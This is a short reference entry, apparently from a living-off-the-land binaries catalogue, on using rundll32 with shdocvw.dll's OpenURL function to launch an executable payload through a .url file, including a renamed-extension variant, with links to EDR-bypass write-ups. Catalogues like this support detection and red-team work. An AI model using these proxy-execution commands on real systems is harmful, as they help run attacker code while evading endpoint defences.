## Shdocvw.dll
* Functions: Execute
```

rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"
Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.

rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.zz"
Renamed URL file.
```
   
* Resources:   
  * http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/
  * https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
  * https://twitter.com/bohops/status/997690405092290561
   
* Full path:   
  * c:\windows\system32\Shdocvw.dll
  * c:\windows\sysWOW64\Shdocvw.dll
   
* Notes: Thanks to Adam - @hexacorn, Jimmy - @bohops  
   
